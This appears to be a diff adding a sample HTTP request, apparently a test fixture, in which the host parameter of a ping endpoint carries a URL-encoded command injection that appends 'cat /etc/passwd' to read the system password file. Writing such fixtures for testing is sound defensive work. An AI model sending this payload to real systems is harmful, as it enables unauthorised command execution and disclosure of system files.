@@ -1,0 +1,4 @@
+GET /tools/ping?host=127.0.0.1%3Bcat%20%2Fetc%2Fpasswd HTTP/1.1
+Host: ops.example.test
+User-Agent: sample-client/1.0
+Accept: application/json
